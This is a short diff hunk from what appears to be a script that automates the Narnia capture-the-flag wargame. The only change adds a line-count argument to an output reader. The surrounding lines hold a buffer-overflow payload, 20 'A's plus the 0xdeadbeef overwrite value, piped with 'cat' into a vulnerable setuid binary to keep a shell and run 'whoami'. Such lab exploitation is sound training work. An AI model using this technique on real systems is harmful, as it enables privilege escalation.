@@ -219,7 +219,7 @@ if connect.connected():
     query = "A" * 20 + r"\xef\xbe\xad\xde"
 
     channel = send_command(command=["cd", dir, "&&", "(", "echo", "-e", f"'{query}';", "cat;", ")", "|", f"./narnia{n}"])
-    output = receive_output(channel=channel)
+    output = receive_output(channel=channel, lines=3)
 
     send_lines_channel(["whoami"], channel)
     output = receive_output(channel=channel)
